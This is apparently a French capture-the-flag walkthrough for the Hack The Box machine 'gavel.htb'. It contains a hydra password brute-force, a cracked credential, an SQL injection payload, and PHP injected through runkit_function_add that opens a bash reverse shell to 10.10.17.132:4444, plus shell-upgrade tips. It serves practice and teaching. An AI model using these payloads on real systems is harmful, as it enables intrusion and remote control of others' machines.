![[IMG-20251213011002825.png]]

![[IMG-20251214003738176.png]]
```
git-dumper http://gavel.htb/.git/ ./dump
```

![[IMG-20251214003749687.png]]
![[IMG-20251214003922760.png]]

Admin username = auctioneer

```
hydra -l auctioneer -P /opt/lists/rockyou.txt gavel.htb http-post-form "/login.php:username=^USER^&password=^PASS^::S=302" 
```

![[IMG-20251214003657731.png]]

```
auctioneer:midnight1
```

OU

Dans le code source on a:
```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";
$itemMap = [];
$itemMeta = $pdo->prepare("SELECT name, description, image FROM items WHERE name = ?");
try {
    if ($sortItem === 'quantity') {
        $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
        $stmt->execute([$userId]);
    } else {
        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
    }
    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) {
    $results = [];
}
```

Injection sql possible:
```
user_id=x` FROM (SELECT group_concat(username,password) AS `'x` FROM users)z;&sort=\?--
```

![[IMG-20251214024606708.png]]

Pourquoi ça marche:

En mettant \`\?\`, PDO ignore ce \`?\` comme placeholder, bind normalement \`user_id\`, puis MySQL transforme \`\\?\` en \`?\` dans une requête déjà cassée par le commentaire, ce qui permet au contenu de \`user_id\` d’être interprété comme du SQL et non comme une valeur.

MySQL est dans un état **impossible** :

- identifiant backtick **ouvert**
- fin de ligne logique atteinte (commentaire)
- requête **syntaxiquement incomplète**
Le parseur **attend encore du SQL**


Bidding appel ça quand on fait \'place bidding\':
![[IMG-20251214144151236.png]]
Dans includes/bid_handler.php on retrouve:
![[IMG-20251214144313253.png]]
Voici la doc de cette fonction:
![[IMG-20251214144122497.png]]
Ce que fait EXACTEMENT `runkit_function_add`:
La signature est :
```php
runkit_function_add(
    string $function_name,
    string $argument_list,
    string $code
);
```
PHP **crée dynamiquement une fonction** nommée `ruleCheck`  
avec exactement ces arguments  
et dont **le corps est la chaîne contenue dans `$rule`**
Puis la fonction est ensuite appelé:
```php
$allowed = ruleCheck($current_bid, $previous_bid, $bidder);
```
Donc on peut mettre une payload dans rule à partir de la page admin:
```php
system("bash -c 'bash -i >& /dev/tcp/10.10.17.132/4444 0>&1'"); return true;
```
URL ENCODE:
```
system%28%22bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E17%2E132%2F4444%200%3E%261%27%22%29%3B%20return%20true%3B
```
return true; est important car dans le code après on vérifie:
```php
if (!$allowed) {
    echo json_encode(['success' => false, 'message' => $rule_message]);
    exit;
}
```

![[IMG-20251214150054379.png]]

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

astuce pour avoir des options tel que clear dans le reverse shell:

Sur la machine local:
```bash
stty raw -echo; fg
```

Sur le reverse shell:
```bash
export TERM=xterm
```

```
find / -type f -perm -010 -group gavel-seller 2>/dev/null
```

![[IMG-20251214170350377.png]]
